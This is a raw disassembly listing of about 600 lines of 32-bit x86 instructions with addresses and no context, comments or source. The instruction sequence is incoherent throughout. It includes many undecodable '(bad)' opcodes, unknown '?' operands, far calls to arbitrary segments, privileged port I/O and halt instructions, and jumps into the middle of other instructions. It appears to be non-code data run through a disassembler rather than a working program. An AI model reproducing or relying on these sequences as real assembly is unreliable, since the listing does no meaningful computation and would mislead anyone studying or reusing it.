  41ac8e:	lock and bh,BYTE PTR [ebx-0x5]
  41ac92:	mov    edi,0x3d04c2e3
  41ac97:	inc    ebp
  41ac98:	push   es
  41ac99:	outs   dx,DWORD PTR ds:[esi]
  41ac9a:	pop    es
  41ac9b:	scas   eax,DWORD PTR es:[edi]
  41ac9c:	cmp    ah,dl
  41ac9e:	push   cs
  41ac9f:	add    bh,ah
  41aca1:	and    ah,BYTE PTR [ebx+edx*2-0x63]
  41aca5:	push   eax
  41aca6:	dec    ebp
  41aca7:	int3   
  41aca8:	jle    0x41ad11
  41acaa:	mov    esp,0x8c3affd9
  41acaf:	test   BYTE PTR [eax+0x7770d713],cl
  41acb5:	int    0x24
  41acb7:	and    al,BYTE PTR [edi+0x19]
  41acba:	mov    WORD PTR [ecx+0x58f561e1],?
  41acc0:	outs   dx,BYTE PTR ds:[esi]
  41acc1:	and    DWORD PTR [ebp+0x40],edx
  41acc4:	inc    edx
  41acc5:	stos   BYTE PTR es:[edi],al
  41acc6:	ss jmp 0xddb8:0x11a3806a
  41acce:	cld    
  41accf:	es loopne 0x41ad07
  41acd2:	push   ebx
  41acd3:	add    BYTE PTR [esi],cl
  41acd5:	call   0x207b:0xb6cf7b74
  41acdc:	call   0xd66b:0xcf0dfc9f
  41ace3:	or     eax,0x34906934
  41ace8:	ss out dx,eax
  41acea:	push   0xf0a1875d
  41acef:	or     edx,DWORD PTR [edi+0x1cd6ec3]
  41acf5:	push   ebp
  41acf6:	jo     0x41ac92
  41acf8:	scas   eax,DWORD PTR es:[edi]
  41acf9:	dec    esi
  41acfa:	retf   0xbbf
  41acfd:	push   ecx
  41acfe:	ror    esp,cl
  41ad00:	mov    ah,0x36
  41ad02:	add    eax,0x3a51e1c6
  41ad07:	and    ecx,DWORD PTR [ebx+0x1c2dba08]
  41ad0d:	in     eax,dx
  41ad0e:	sbb    al,0xc1
  41ad10:	hlt    
  41ad11:	test   DWORD PTR [edx+0x42],ebp
  41ad14:	shl    BYTE PTR [ebp+0x76daf08f],cl
  41ad1a:	fidivr DWORD PTR [edx-0x3]
  41ad1d:	dec    ecx
  41ad1e:	das    
  41ad1f:	fs ret 
  41ad21:	xor    esi,0x5c
  41ad24:	pop    ds
  41ad25:	pop    ebp
  41ad26:	int    0xe5
  41ad28:	or     BYTE PTR [edx],0x1e
  41ad2b:	push   eax
  41ad2c:	dec    edi
  41ad2d:	shl    DWORD PTR [edi],cl
  41ad2f:	jp     0x41ad2d
  41ad31:	fiadd  DWORD PTR [edi-0x1d]
  41ad34:	pop    ebx
  41ad35:	fst    QWORD PTR [ecx+0xd02de3]
  41ad3b:	js     0x41ad49
  41ad3d:	mov    bh,0x2e
  41ad3f:	ss and al,0x8e
  41ad42:	jle    0x41ad17
  41ad44:	pushw  ds
  41ad46:	jae    0x41ad0f
  41ad48:	bound  eax,QWORD PTR [edi-0x68]
  41ad4b:	jg     0x41ad9e
  41ad4d:	sub    ebp,DWORD PTR [eax]
  41ad4f:	cvttps2pi mm7,QWORD PTR [ebx]
  41ad52:	lea    eax,[eax+0x513876fa]
  41ad58:	fcomi  st,st(0)
  41ad5a:	xchg   edx,eax
  41ad5b:	jae    0x41ad1a
  41ad5d:	mov    dh,0x19
  41ad5f:	mov    bh,0x4
  41ad61:	push   ebp
  41ad62:	or     eax,0xd0887ae
  41ad67:	fiadd  DWORD PTR [edx+0x47ade313]
  41ad6d:	pushf  
  41ad6e:	jnp    0x41ad40
  41ad70:	jbe    0x41ad1e
  41ad72:	daa    
  41ad73:	mov    esp,0xbc4ca37
  41ad78:	dec    edx
  41ad79:	and    esp,DWORD PTR [edi-0x3f]
  41ad7c:	dec    BYTE PTR [edx+0x10686985]
  41ad82:	(bad)  
  41ad83:	lods   al,BYTE PTR ds:[esi]
  41ad84:	sbb    dh,bl
  41ad86:	ins    DWORD PTR es:[edi],dx
  41ad87:	xlat   BYTE PTR ds:[ebx]
  41ad88:	inc    esp
  41ad89:	fcmovb st,st(6)
  41ad8b:	sbb    dl,bh
  41ad8d:	push   ss
  41ad8e:	loope  0x41ad6a
  41ad90:	mov    DWORD PTR [ebx],esp
  41ad92:	mov    ebx,esi
  41ad94:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41ad95:	or     bl,ch
  41ad97:	dec    esp
  41ad98:	(bad)  [edi]
  41ad9a:	sar    BYTE PTR [ebp+0x27],cl
  41ad9d:	(bad)  
  41ad9f:	mov    ?,edi
  41ada1:	push   eax
  41ada2:	into   
  41ada3:	push   0xabb6dab3
  41ada8:	aam    0x3f
  41adaa:	xchg   edi,eax
  41adab:	bound  eax,QWORD PTR [edx-0x48]
  41adae:	pop    edx
  41adaf:	push   esp
  41adb0:	xor    BYTE PTR [ecx],al
  41adb2:	pop    edx
  41adb3:	lahf   
  41adb4:	ficomp DWORD PTR [edi+0x7a]
  41adb7:	or     al,0x8e
  41adb9:	jge    0x41ae1d
  41adbb:	xor    al,0x44
  41adbd:	sbb    ah,cl
  41adbf:	xchg   edi,eax
  41adc0:	add    al,0xdd
  41adc2:	fld    DWORD PTR [esi-0x36]
  41adc5:	(bad)  
  41adc6:	adc    eax,0x9dd79a5
  41adcb:	les    edx,FWORD PTR ds:0xc48c65a9
  41add1:	ins    DWORD PTR es:[edi],dx
  41add2:	fsub   QWORD PTR [edx+eax*8+0x72]
  41add6:	cli    
  41add7:	dec    esi
  41add8:	inc    esi
  41add9:	sahf   
  41adda:	or     BYTE PTR [esi+0x492526f2],ch
  41ade0:	push   ds
  41ade1:	nop
  41ade2:	dec    dx
  41ade4:	jo     0x41ad75
  41ade6:	sub    BYTE PTR [eax-0x4a],ch
  41ade9:	cld    
  41adea:	push   ss
  41adeb:	cmp    ch,BYTE PTR [esi]
  41aded:	lds    edi,FWORD PTR [ecx+0x3ccc4a7b]
  41adf3:	fucom  st(0)
  41adf5:	mov    dh,0x67
  41adf7:	xlat   BYTE PTR ds:[ebx]
  41adf8:	call   0x9069:0xc124
  41adfe:	clc    
  41adff:	rcr    BYTE PTR [edx+0x75b889d0],cl
  41ae05:	mov    bl,bh
  41ae07:	fldcw  WORD PTR [ebx]
  41ae09:	cwde   
  41ae0a:	mov    al,ds:0xeb078d30
  41ae0f:	inc    ebx
  41ae10:	test   BYTE PTR [edi+0x25],dh
  41ae13:	dec    edi
  41ae14:	fucom  st(6)
  41ae16:	ss js  0x41ae6e
  41ae19:	hlt    
  41ae1a:	mov    esp,0xe389584c
  41ae1f:	xor    BYTE PTR [esi],bh
  41ae21:	push   esi
  41ae22:	xchg   edx,eax
  41ae23:	test   BYTE PTR [edx-0x2846b919],ch
  41ae29:	fist   WORD PTR [ecx+0xffd4b65]
  41ae2f:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41ae30:	push   ecx
  41ae31:	mov    ah,0x62
  41ae33:	(bad)  
  41ae34:	sbb    DWORD PTR [edx],esi
  41ae36:	mov    WORD PTR [edx-0x656e3787],ss
  41ae3c:	outs   dx,BYTE PTR ds:[esi]
  41ae3d:	pop    eax
  41ae3e:	pop    ebp
  41ae3f:	xchg   edx,eax
  41ae40:	add    al,0x20
  41ae42:	xchg   esi,eax
  41ae43:	jno    0x41adda
  41ae45:	xor    cl,BYTE PTR [ebx+edx*4+0x15]
  41ae49:	jp     0x41ae23
  41ae4b:	aas    
  41ae4c:	fwait
  41ae4d:	push   ebx
  41ae4e:	into   
  41ae4f:	mov    BYTE PTR [ebx-0x2a4a7004],al
  41ae55:	jecxz  0x41ae97
  41ae57:	add    BYTE PTR [ebx-0x15],dh
  41ae5a:	cmp    edx,ebx
  41ae5c:	into   
  41ae5d:	es jle 0x41ae37
  41ae60:	cmp    DWORD PTR [ecx],eax
  41ae62:	cdq    
  41ae63:	cs pop edx
  41ae65:	fadd   st,st(4)
  41ae68:	sbb    BYTE PTR [eax],cl
  41ae6a:	pop    ss
  41ae6b:	popf   
  41ae6c:	jmp    0xe79d950a
  41ae71:	or     cl,dh
  41ae73:	int    0x6a
  41ae75:	xor    BYTE PTR [edx+0x43ec9ca9],ah
  41ae7b:	mov    dh,0x37
  41ae7d:	hlt    
  41ae7e:	adc    al,0x5
  41ae80:	test   dl,dl
  41ae82:	adc    BYTE PTR [ecx-0x5ee60778],dl
  41ae88:	cmp    BYTE PTR [ebp+0xe],dh
  41ae8b:	xor    ebx,ecx
  41ae8d:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41ae8e:	inc    edi
  41ae8f:	(bad)  
  41ae91:	cmp    DWORD PTR [bx],ebx
  41ae94:	pop    ss
  41ae95:	data16 or bl,BYTE PTR [eax+0x52]
  41ae99:	lahf   
  41ae9a:	mov    ecx,0xb7c803ad
  41ae9f:	das    
  41aea0:	pop    edx
  41aea1:	dec    DWORD PTR [ebp+0x56]
  41aea4:	sbb    bl,BYTE PTR [edi+eax*1]
  41aea7:	pop    ecx
  41aea8:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41aea9:	movs   DWORD PTR es:[edi],DWORD PTR cs:[esi]
  41aeab:	hlt    
  41aeac:	and    cl,BYTE PTR ds:0xb9929c6e
  41aeb2:	cwde   
  41aeb3:	fs inc edx
  41aeb5:	pop    edx
  41aeb6:	imul   ecx,DWORD PTR [esi+0x27],0xffffffac
  41aeba:	test   BYTE PTR [esi-0x16],ch
  41aebd:	sub    al,0x2c
  41aebf:	(bad)  
  41aec0:	dec    ecx
  41aec1:	cmp    BYTE PTR [eax],0xb6
  41aec4:	xchg   ebx,eax
  41aec5:	or     ecx,DWORD PTR [ecx+0x36]
  41aec8:	or     ch,BYTE PTR [ebx]
  41aeca:	sub    DWORD PTR [edi],ecx
  41aecc:	inc    edi
  41aecd:	mov    esp,0x7f2d9b6d
  41aed2:	test   al,0x56
  41aed4:	loop   0x41ae56
  41aed6:	xchg   edx,eax
  41aed7:	test   al,0xe6
  41aed9:	xor    DWORD PTR [edi],0xffffffbe
  41aedc:	mov    edi,0x572491d6
  41aee1:	fidiv  WORD PTR [eax+0x44]
  41aee4:	mov    al,0x11
  41aee6:	mov    al,0x6
  41aee8:	push   ebx
  41aee9:	loopne 0x41af34
  41aeeb:	aas    
  41aeec:	mov    eax,ds:0x94408c2e
  41aef1:	inc    edi
  41aef2:	bound  esi,QWORD PTR [ebx]
  41aef4:	pusha  
  41aef5:	fcom   DWORD PTR [edx-0x3c]
  41aef8:	xchg   edx,eax
  41aef9:	test   al,0xab
  41aefb:	mov    ch,0xcb
  41aefd:	stos   BYTE PTR es:[edi],al
  41aefe:	and    eax,DWORD PTR [eax-0x3c878e4d]
  41af04:	mov    eax,0xcf846432
  41af09:	jg     0x41aec6
  41af0b:	pop    ebx
  41af0c:	(bad)  
  41af0d:	ficomp WORD PTR [edi-0x1500df15]
  41af13:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41af14:	pop    esp
  41af15:	xchg   esi,eax
  41af16:	ret    
  41af17:	xchg   esp,eax
  41af18:	mov    bh,0xfc
  41af1a:	mov    eax,0x1cfd661d
  41af1f:	mov    esi,0x38121927
  41af24:	lods   eax,DWORD PTR ds:[esi]
  41af25:	cld    
  41af26:	lock mov eax,ds:0xd477243f
  41af2c:	(bad)  
  41af2d:	mov    BYTE PTR [eax-0x36],al
  41af30:	neg    BYTE PTR [ebp-0x542ea326]
  41af36:	ret    
  41af37:	sbb    eax,0xc479c429
  41af3c:	sub    esi,DWORD PTR [edi+0x577b1970]
  41af42:	in     eax,dx
  41af43:	enter  0x186a,0xc7
  41af47:	xor    dl,BYTE PTR [esi-0x3f]
  41af4a:	xchg   ebx,eax
  41af4b:	cdq    
  41af4c:	or     eax,0x205ed622
  41af51:	mov    eax,ds:0x98463173
  41af56:	ret    
  41af57:	adc    eax,0xf9204ea7
  41af5c:	popa   
  41af5d:	or     al,0x1c
  41af5f:	hlt    
  41af60:	and    eax,0x9d249655
  41af65:	push   es
  41af66:	test   BYTE PTR [edx],dl
  41af68:	pop    eax
  41af69:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41af6a:	ja     0x41af6b
  41af6c:	push   edx
  41af6d:	sub    ch,BYTE PTR [edx+0x337df26e]
  41af73:	test   al,0x19
  41af75:	leave  
  41af76:	mov    ah,BYTE PTR [ebp-0x9]
  41af79:	dec    eax
  41af7a:	call   0xdf98ae8a
  41af7f:	and    al,dl
  41af81:	ins    DWORD PTR es:[edi],dx
  41af82:	in     al,dx
  41af83:	jg     0x41af80
  41af85:	out    0x20,al
  41af87:	add    al,0xc
  41af89:	pushf  
  41af8a:	mov    bh,0x8e
  41af8c:	xor    edx,DWORD PTR [esi-0x28]
  41af8f:	cmp    al,0x1c
  41af91:	imul   BYTE PTR [eax+0x54764227]
  41af97:	in     al,dx
  41af98:	jo     0x41afe6
  41af9a:	int    0xe4
  41af9c:	cmp    eax,0x639fe537
  41afa1:	sar    DWORD PTR [edx],0x1
  41afa4:	mov    edx,esp
  41afa6:	mov    bh,BYTE PTR [ebx]
  41afa8:	mov    eax,0xb33b1927
  41afad:	sub    eax,0x5e9dfb06
  41afb2:	repz and DWORD PTR [edi-0x51fd101a],eax
  41afb9:	cdq    
  41afba:	adc    eax,0xc80d0e5a
  41afbf:	dec    esp
  41afc0:	xlat   BYTE PTR ds:[ebx]
  41afc1:	pop    esp
  41afc2:	xlat   BYTE PTR ds:[ebx]
  41afc3:	ja     0x41afd1
  41afc5:	lods   eax,DWORD PTR ds:[esi]
  41afc6:	lock (bad) 
  41afc8:	xor    BYTE PTR [eax],ah
  41afca:	pop    esi
  41afcb:	ficomp DWORD PTR [edi-0x53]
  41afce:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41afcf:	cmc    
  41afd0:	(bad)  
  41afd1:	dec    edx
  41afd2:	lods   eax,DWORD PTR ds:[esi]
  41afd3:	xchg   DWORD PTR [ebx],ebx
  41afd5:	cld    
  41afd6:	popa   
  41afd7:	mov    ebx,0x63760e1c
  41afdc:	std    
  41afdd:	test   al,0x1
  41afdf:	jbe    0x41b02f
  41afe1:	sahf   
  41afe2:	shl    BYTE PTR [edi-0x1ba75fed],1
  41afe8:	mov    al,ds:0x8d0d07bd
  41afed:	fcom   st(0)
  41afef:	(bad)  
  41aff0:	mov    esi,0x814a57e7
  41aff5:	pop    ds
  41aff6:	stc    
  41aff7:	adc    al,0x70
  41aff9:	push   edx
  41affa:	stc    
  41affb:	stos   DWORD PTR es:[edi],eax
  41affc:	cmp    BYTE PTR gs:[edx],bl
  41afff:	mov    ebp,0xdecd6a1
  41b004:	(bad)  
  41b005:	int3   
  41b006:	xor    DWORD PTR [ecx+0x40],edx
  41b009:	nop
  41b00a:	pop    ebx
  41b00b:	ins    BYTE PTR es:[edi],dx
  41b00c:	in     eax,0x47
  41b00e:	mov    al,0x18
  41b010:	sbb    al,0x9a
  41b012:	std    
  41b013:	lods   al,BYTE PTR ds:[esi]
  41b014:	jg     0x41afab
  41b016:	setp   BYTE PTR [esi-0x613ebca8]
  41b01d:	mov    edi,0x3602e792
  41b022:	xor    al,0x3e
  41b024:	xchg   DWORD PTR [ecx],edx
  41b026:	test   edx,esp
  41b028:	shr    DWORD PTR [ecx-0x17f1f09],cl
  41b02e:	cmovle ecx,DWORD PTR [esp+esi*4]
  41b032:	dec    edi
  41b033:	and    ah,ch
  41b035:	sbb    esp,DWORD PTR [ebx-0x1b580e9c]
  41b03b:	pop    ds
  41b03c:	fbstp  TBYTE PTR [ebx+0x41]
  41b03f:	cmp    al,0xb6
  41b041:	retf   
  41b042:	loope  0x41b026
  41b044:	and    eax,0x57990245
  41b049:	pop    eax
  41b04a:	xor    cl,dh
  41b04c:	mov    dl,0xa4
  41b04e:	mov    ?,WORD PTR [ecx-0x56]
  41b051:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41b052:	push   esp
  41b053:	dec    ebp
  41b054:	push   0xffffffcd
  41b056:	fwait
  41b057:	and    DWORD PTR [edi+0x28],esp
  41b05a:	shr    DWORD PTR [edx],cl
  41b05c:	or     al,0x3
  41b05e:	mov    cl,0x3f
  41b060:	cmp    BYTE PTR [esp+eax*8],0xec
  41b064:	jo     0x41b0b6
  41b066:	mov    ebp,0x3e471420
  41b06b:	sbb    DWORD PTR [edi+0x7d],0x43
  41b06f:	xchg   ebp,eax
  41b070:	in     al,dx
  41b071:	inc    ebp
  41b072:	sbb    edx,DWORD PTR [ebx]
  41b074:	mov    dl,0x3d
  41b076:	mov    BYTE PTR [edi-0x2f],dl
  41b079:	stos   BYTE PTR es:[edi],al
  41b07a:	(bad)  
  41b07b:	sub    DWORD PTR [eax-0x11],eax
  41b07e:	fst    DWORD PTR [edx-0x79ffc873]
  41b084:	test   bh,ah
  41b086:	jae    0x41b08b
  41b088:	pop    edx
  41b089:	sub    DWORD PTR [edi+edx*1-0x23],esp
  41b08d:	mov    cl,0x4b
  41b08f:	hlt    
  41b090:	mov    al,0xf7
  41b092:	lock call DWORD PTR [bx+di]
  41b096:	jmp    0x41b0e6
  41b098:	and    bl,BYTE PTR [esi+edi*2-0x67]
  41b09c:	and    ebx,DWORD PTR [eax+0x3d]
  41b09f:	mov    DWORD PTR [eax-0x50],ebx
  41b0a2:	addr16 data16 clc 
  41b0a5:	jne    0x41b097
  41b0a7:	cdq    
  41b0a8:	and    DWORD PTR [ebx-0x41],edi
  41b0ab:	shl    dh,cl
  41b0ad:	ds das 
  41b0af:	pop    esi
  41b0b0:	sub    eax,0xcb0c0559
  41b0b5:	cmp    BYTE PTR [ecx],dh
  41b0b7:	je     0x41b075
  41b0b9:	inc    ecx
  41b0ba:	sbb    DWORD PTR [ecx-0x6b64ead7],edx
  41b0c0:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41b0c1:	mov    eax,ds:0x905ef05e
  41b0c6:	add    al,0x94
  41b0c8:	xchg   ebp,eax
  41b0c9:	inc    edx
  41b0ca:	pop    eax
  41b0cb:	xchg   ebp,eax
  41b0cc:	mov    ecx,0x41788131
  41b0d1:	xlat   BYTE PTR ds:[ebx]
  41b0d2:	jne    0x41b055
  41b0d4:	push   es
  41b0d5:	(bad)  
  41b0d6:	aam    0x1a
  41b0d8:	push   0x15
  41b0da:	pusha  
  41b0db:	mov    esi,0xe844094c
  41b0e0:	test   DWORD PTR [ebp-0x779389fa],ebx
  41b0e6:	rcl    bl,0x95
  41b0e9:	(bad)  
  41b0ea:	out    0x64,eax
  41b0ec:	push   es
  41b0ed:	imul   esp,DWORD PTR [eax+0x24],0x1c
  41b0f1:	js     0x41b095
  41b0f3:	stos   BYTE PTR es:[edi],al
  41b0f4:	mov    ss:0xe322f4ee,eax
  41b0fa:	je     0x41b0f8
  41b0fc:	push   esi
  41b0fd:	adc    DWORD PTR [eax+ebx*1+0x798b605a],ebx
  41b104:	jge    0x41b08e
  41b106:	jns    0x41b171
  41b108:	adc    DWORD PTR [eax-0x35],ebp
  41b10b:	int    0x78
  41b10d:	dec    ecx
  41b10e:	adc    BYTE PTR [ecx-0x3ecd261e],bh
  41b114:	mov    DWORD PTR [edx],ecx
  41b116:	in     al,dx
  41b117:	gs sahf 
  41b119:	mov    ?,edi
  41b11b:	mov    es,WORD PTR [edi]
  41b11d:	ret    
  41b11e:	xchg   esi,eax
  41b11f:	dec    ebp
  41b120:	mov    dh,0xe8
  41b122:	mov    eax,ds:0xd11025ae
  41b127:	pop    ss
  41b128:	in     eax,0xd6
  41b12a:	adc    al,0x56
  41b12c:	leave  
  41b12d:	mov    edx,0xf9f5ea44
  41b132:	push   ebp
  41b133:	mov    DWORD PTR [ebx-0x1b],ebx
  41b136:	xchg   BYTE PTR [eax-0x66],dh
  41b139:	cmp    al,0x33
  41b13b:	dec    esp
  41b13c:	mov    edx,0xc1b3deb0
  41b141:	sub    eax,DWORD PTR [ebp+eiz*8-0x640364fc]
  41b148:	adc    eax,0x51ab1b2f
  41b14d:	jne    0x41b1bb
  41b14f:	jl     0x41b0e1
  41b151:	es dec sp
  41b154:	gs lahf 
  41b156:	cdq    
  41b157:	cmp    eax,0xee5997a
  41b15c:	adc    eax,0xa8e60f2c
  41b161:	sbb    eax,0xe5467c28
  41b166:	push   ebp
  41b167:	shr    BYTE PTR [ecx],1
  41b169:	and    eax,0x9da2ed01
  41b16e:	and    WORD PTR [eax+0x734cb708],bp
  41b175:	scas   eax,DWORD PTR es:[edi]
  41b176:	mov    esp,0xcc0855b1
  41b17b:	gs pop ds
  41b17d:	xlat   BYTE PTR ds:[ebx]
  41b17e:	adc    edi,esp
  41b180:	in     eax,0xcd
  41b182:	jo     0x41b12c
  41b184:	in     eax,dx
  41b185:	inc    eax
  41b186:	adc    ch,bl
  41b188:	scas   eax,DWORD PTR es:[edi]
  41b189:	(bad)  
  41b18b:	loope  0x41b1ef
  41b18d:	xor    al,0x58
  41b18f:	jno    0x41b19b
  41b191:	push   ds
  41b192:	adc    DWORD PTR [ebx+ebx*4+0x5d],esi
  41b196:	pop    ebx
  41b197:	scas   al,BYTE PTR es:[edi]
  41b198:	cdq    
  41b199:	push   edi
  41b19a:	imul   ebp,ecx,0xffffffd0
  41b19d:	test   DWORD PTR [edx],0xfbe688b8
  41b1a3:	push   edx
  41b1a4:	lds    ebp,FWORD PTR [ebx]
  41b1a6:	sbb    dh,0x77
  41b1a9:	out    0x5c,al
  41b1ab:	pop    esp
  41b1ac:	(bad)  
  41b1ad:	pushf  
  41b1ae:	je     0x41b18c
  41b1b0:	xor    BYTE PTR [ecx],cl
  41b1b2:	in     eax,dx
  41b1b3:	add    ch,BYTE PTR [esi-0x60b7e8d5]
  41b1b9:	and    BYTE PTR [ecx+eax*2-0x80126c4],dh
  41b1c0:	mov    fs,edx
  41b1c2:	xor    bl,0xa0
  41b1c5:	stos   DWORD PTR es:[edi],eax
  41b1c6:	pop    esi
  41b1c7:	jge    0x41b14b
  41b1c9:	push   ecx
  41b1ca:	mov    DWORD PTR [ebx-0x42a0d632],ebp
  41b1d0:	sbb    BYTE PTR [edx+0x18],0x15
  41b1d4:	xor    DWORD PTR ds:0xfea679ea,0x1
  41b1db:	mov    ebx,0x49d2e7c0
  41b1e0:	fisttp QWORD PTR [ebp+edi*1+0x1bf19a93]
  41b1e7:	jg     0x41b24d
  41b1e9:	daa    
  41b1ea:	push   esi
  41b1eb:	(bad)  
  41b1ec:	and    BYTE PTR [ecx+0x668f45f6],ch
  41b1f2:	ret    
  41b1f3:	mov    bl,BYTE PTR [esi]
  41b1f5:	mov    dl,0x30
  41b1f7:	fistp  QWORD PTR [edi-0x296b0d70]
  41b1fd:	outs   dx,DWORD PTR ds:[esi]
  41b1fe:	mov    al,BYTE PTR [ecx-0x34]
  41b201:	jg     0x41b277
  41b203:	out    0x4b,eax
  41b205:	add    BYTE PTR [esi],0xe0
  41b208:	jae    0x41b1c7
  41b20a:	dec    ecx
  41b20b:	pop    ss
  41b20c:	rol    DWORD PTR [ebx-0x45],1
  41b20f:	mov    DWORD PTR [edx+0x1c],0xd2229393
  41b216:	lods   al,BYTE PTR ds:[esi]
  41b217:	cmp    al,0x97
  41b219:	stc    
  41b21a:	xlat   BYTE PTR ds:[ebx]
  41b21b:	mov    ah,0x70
  41b21d:	in     al,0x4c
  41b21f:	aaa    
  41b220:	int    0x82
  41b222:	(bad)  
  41b223:	out    0xa4,eax
  41b225:	adc    eax,0x396d2f8a
  41b22a:	lods   al,BYTE PTR ds:[esi]
  41b22b:	into   
  41b22c:	xor    al,0xf5
  41b22e:	imul   edx,edx,0xffffffc8
  41b231:	ror    eax,cl
  41b233:	or     edx,esp
  41b235:	and    eax,0x74b29c6b
  41b23a:	sub    esi,ebx
  41b23c:	cwde   
  41b23d:	das    
  41b23e:	lea    ecx,[eax]
  41b240:	mov    eax,ds:0x732f2842
  41b245:	cmp    cl,dh
  41b247:	iret   
  41b248:	int3   
  41b249:	pop    esp
  41b24a:	ins    DWORD PTR es:[edi],dx
  41b24b:	push   esi
  41b24c:	fisubr DWORD PTR [ebx]
  41b24e:	fimul  DWORD PTR [ebx-0x3aa38614]
  41b254:	das    
  41b255:	jmp    DWORD PTR ds:0x5cba7b5f
  41b25b:	and    edx,eax
  41b25d:	pop    ss
  41b25e:	ret    0xc988
  41b261:	sub    ch,BYTE PTR [esi]
  41b263:	push   ds
  41b264:	ficomp DWORD PTR [ebp+0x1f77bde]
  41b26a:	stos   DWORD PTR es:[edi],eax
  41b26b:	xor    DWORD PTR [eax-0x4b],0x260aa375
  41b272:	and    bl,BYTE PTR [edx+0x5c5eb516]
  41b278:	fidiv  WORD PTR [edi]
  41b27a:	nop
  41b27b:	and    edi,DWORD PTR [esi]
  41b27d:	fist   DWORD PTR [ecx-0x3717934e]
  41b283:	iret   
  41b284:	cmp    ch,BYTE PTR [ebx-0x5d]
  41b287:	mov    dh,BYTE PTR [esi]
  41b289:	sub    DWORD PTR [esi+0x3ab4935],eax
  41b28f:	outs   dx,DWORD PTR ds:[esi]
  41b290:	cmp    eax,0x2133b19a
  41b295:	jnp    0x41b2fd
  41b297:	and    ah,bh
  41b299:	lds    eax,FWORD PTR ds:0x37e4592c
  41b29f:	push   esp
  41b2a0:	cmc    
  41b2a1:	xchg   esp,eax
  41b2a2:	fisttp WORD PTR [edx]
  41b2a4:	sub    eax,0x70c501d9
  41b2a9:	push   ecx
  41b2aa:	pop    ss
  41b2ab:	dec    edx
  41b2ac:	cwde   
  41b2ad:	ja     0x41b326
  41b2af:	in     eax,0x71
  41b2b1:	icebp  
  41b2b2:	jle    0x41b258
  41b2b4:	or     eax,0x9b179e1
  41b2b9:	inc    esp
  41b2ba:	in     eax,dx
  41b2bb:	pop    es
  41b2bc:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41b2bd:	xchg   ebx,eax
  41b2be:	test   BYTE PTR [eax+0x22],dl
  41b2c1:	jmp    0x41b342
  41b2c3:	jns    0x41b320
  41b2c5:	jb     0x41b264
  41b2c7:	(bad)  
  41b2c8:	mov    al,0xdd
  41b2ca:	jns    0x41b31c
  41b2cc:	jp     0x41b30c
  41b2ce:	mov    esp,DWORD PTR [ebp+ebp*8-0x1e0b5875]
  41b2d5:	outs   dx,DWORD PTR ds:[esi]
  41b2d6:	add    ch,bl
  41b2d8:	adc    ch,bl
  41b2da:	cmp    al,0x57
  41b2dc:	inc    esi
  41b2dd:	lods   al,BYTE PTR ds:[esi]
  41b2de:	aaa    
  41b2df:	push   ebx
  41b2e0:	sbb    ebx,DWORD PTR [edi+0x28]
  41b2e3:	lea    edx,[ecx]
  41b2e5:	in     al,dx
  41b2e6:	rcl    edx,cl
  41b2e8:	or     DWORD PTR [ebx-0x18],0xbdf5c154
  41b2ef:	push   cs
  41b2f0:	gs dec esi
  41b2f2:	xchg   ebx,eax
  41b2f3:	std    
  41b2f4:	addr16 xchg edi,eax
  41b2f6:	test   eax,0x377bdd4d
  41b2fb:	sub    al,0xaf
  41b2fd:	cmp    al,0x8a
  41b2ff:	mov    ecx,0x98308ec4
  41b304:	(bad)  
  41b305:	js     0x41b324
  41b307:	and    BYTE PTR ds:0xffda5225,al
  41b30d:	mov    edi,0x2b3f750f
  41b312:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41b313:	pop    eax
  41b314:	push   ds
  41b315:	or     al,0x5a
  41b317:	std    
  41b318:	mov    ch,0x7e
  41b31a:	stos   BYTE PTR es:[edi],al
  41b31b:	and    al,0xed
  41b31e:	bswap  ecx
  41b320:	cmp    al,0x6a
  41b322:	cmp    BYTE PTR [edi],dl
  41b324:	test   al,0x9b
  41b326:	inc    ebx
  41b327:	outs   dx,BYTE PTR ds:[esi]
  41b328:	mov    cl,0x80
  41b32a:	inc    eax
  41b32b:	cld    
  41b32c:	gs into 
  41b32e:	adc    ch,BYTE PTR [eax+0x79]
  41b331:	sub    DWORD PTR [esi],esp
  41b333:	mov    al,0x5f
  41b335:	or     BYTE PTR [esi-0x19e2b26b],cl
  41b33b:	xor    BYTE PTR [esi],bh
  41b33d:	pop    ecx
  41b33e:	out    dx,al
  41b33f:	neg    DWORD PTR [edx+0x9a7b085]
  41b345:	add    dl,BYTE PTR [bx+si]
  41b348:	rcl    eax,0x1f
  41b34b:	push   ebp
  41b34c:	into   
  41b34d:	pop    es
  41b34e:	ja     0x41b32e
  41b350:	push   eax
  41b351:	test   DWORD PTR [ebx-0x92e94a2],ebp
  41b357:	jp     0x41b2de
  41b359:	adc    eax,0x6bd48a6c
  41b35e:	dec    eax
  41b35f:	pop    edi
  41b360:	xor    eax,0x9d0e3a08
  41b365:	out    dx,eax
  41b366:	mov    cl,0x80
  41b368:	cld    
  41b369:	dec    esp
  41b36a:	mov    al,0x46
  41b36c:	mov    esi,0xd2c3932a
  41b371:	call   0x47e8:0xcc3540c
  41b378:	pop    es
  41b379:	es mov edx,0x64c84697
  41b37f:	frstor [ecx-0x35]
  41b382:	xchg   BYTE PTR [ecx+0x71795798],bl
  41b388:	aas    
  41b389:	ror    ch,1
  41b38b:	lods   eax,DWORD PTR ds:[esi]
  41b38c:	pop    ds
  41b38d:	sbb    edi,edi
  41b38f:	scas   eax,DWORD PTR es:[edi]
  41b390:	call   0xec6f8a61
  41b395:	js     0x41b35f
  41b397:	inc    edx
  41b398:	fstp   DWORD PTR [ecx]
  41b39a:	dec    edi
  41b39b:	mov    ds:0xb6a3c711,eax
  41b3a0:	inc    ebp
  41b3a1:	add    esi,ecx
  41b3a3:	jno    0x41b3ff
  41b3a5:	iret   
  41b3a6:	mov    dh,0x3d
  41b3a8:	dec    ecx
  41b3a9:	(bad)  
  41b3aa:	retf   0x8ee0
  41b3ad:	ins    DWORD PTR es:[edi],dx
  41b3ae:	fnstsw WORD PTR [edi+0x3a]
  41b3b1:	sar    DWORD PTR [ebp+0x51],cl
